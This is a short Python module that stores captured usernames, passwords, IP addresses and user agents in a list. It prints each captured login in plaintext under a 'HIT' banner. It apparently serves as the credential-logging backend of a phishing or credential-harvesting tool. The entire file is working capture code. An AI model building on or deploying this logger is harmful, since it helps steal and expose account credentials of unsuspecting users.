from typing import *
from dataclasses import dataclass


@dataclass
class Credential:
    username: str
    password: str
    ip_addr: str
    useragent: str


credential_list = list()


def log_credentials(username: str, password: str, ip_addr: str=None, useragent: str=None):
    credential_list.append(Credential(username, password, ip_addr, useragent))
    print('\n----------HIT----------\n'
          'Username: \'{0}\'\n'
          'Password: \'{1}\'\n'
          'IP: \'{2}\'\n'
          'Useragent: \'{3}\'\n'
          '-----------------------\n'
          .format(username, password, ip_addr, useragent))


def get_credentials() -> List[Credential]:
    return credential_list
